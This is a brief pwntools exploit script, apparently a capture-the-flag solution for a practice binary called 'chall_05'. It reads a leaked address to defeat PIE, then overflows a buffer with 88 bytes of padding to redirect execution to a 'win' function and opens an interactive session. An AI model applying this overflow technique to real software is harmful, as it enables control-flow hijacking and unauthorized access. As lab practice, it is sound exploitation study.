from pwn import *
r=process("./chall_05")
r.recvuntil(":")
leak=r.recv()
intleak = int(leak,16)
elf=ELF("./chall_05")
elf.address = intleak - elf.sym.main
hex(elf.address)
r.sendline(b'a'*88+p64(elf.sym.win))
r.interactive()
r.close()
